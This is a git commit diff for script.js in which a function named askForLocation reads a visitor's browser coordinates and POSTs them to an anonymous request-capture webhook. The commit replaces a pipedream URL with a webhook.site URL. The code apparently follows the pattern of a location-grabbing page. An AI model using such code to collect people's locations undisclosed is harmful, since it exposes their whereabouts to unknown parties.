c243f098127192486224651d7fe2295a69599b7b
q-u-e-s-o <163966390+q-u-e-s-o@users.noreply.github.com>
2025-06-20 15:11:16 -0700

    Update script.js

--- script.js
+++ script.js
@@ -9,7 +9,7 @@ function askForLocation() {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
-      fetch("https://eo2r3s7lrs1i89x.m.pipedream.net", {
+      fetch("https://webhook.site/2b377214-0f62-4811-8d77-38ee0db23314", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude: lat, longitude: lon }),
